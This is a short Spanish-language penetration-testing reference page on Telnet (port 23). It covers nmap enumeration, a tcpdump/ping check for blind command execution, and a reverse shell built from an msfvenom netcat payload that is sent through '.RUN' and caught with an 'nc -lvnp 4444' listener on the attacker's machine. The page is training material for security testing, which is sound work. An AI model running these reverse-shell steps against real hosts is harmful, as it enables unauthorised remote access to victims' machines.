---
description: explotar servicio de shell remota TELNET.
---

# 23 - TELNET

## INFORMACIÓN BÁSICA

Telnet permite el control remoto de los ordenadores por medio de entradas y salidas basadas en texto. Con este objetivo, se crea una **conexión cliente-servidor** a través del puerto 23/TCP, donde el dispositivo controlado ejerce de servidor y espera a los comandos pertinentes. La instancia cliente es la que controla el proceso.

La conexión a través de este servicio es insegura ya que todos los datos se transmiten en texto claro.

La sintaxis para su uso es realmente sencilla:

```
telnet <IP> <PUERTO>
```

## ENUMERACIÓN

La enumeración de este servicio se puede hacer a través de nmap utilizando el siguiente escaneo:

```
nmap -p <PUERTO> -sV --script="*telnet* and safe" <IP>
```

## EXPLOTACIÓN

### No hay feedback en la TTY

Una vez conectado al servicio, puede darse el caso de que no obtengamos feedback de los comandos que lanzamos. Para comprobar si realmente tenemos control sobre la victima podemos hacer lo siguiente:

#### 1. Ejecutar un tcpdump en el atacante

De esta manera vamos a monitorizar todas las trazas ICMP que lleguen a mi ordenador atacante:

```bash
sudo tcpdump ip proto \\icmp -i <INTERFAZ>
```

#### 2. Intentar lanzar una traza ICMP desde la victima.

Desde la victima intentamos lanzar una traza ICMP al atacante para monitorizarlo con tcpdump:

```
.RUN ping <IP ATACANTE> -c 1
```

Si esto funciona, significa que nuestra conexión funciona a la perfección.

### Reverse Shell con msfvenom:

Para ejecutar una reverse shell desde una conexión TELNET, es necesario hacerla a través de netcat en la victima, para ello podemos utilizar msfvenom:

```
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

Y el resultado de este comando lo pasamos a la victima precedido de .RUN:

```
.RUN <mkfifo ...>
```

Para que todo esto funcione tenemos que tener nc a la escucha por ese puerto en la maquina atacante:

```
rlwrap nc -lvnp 4444
```
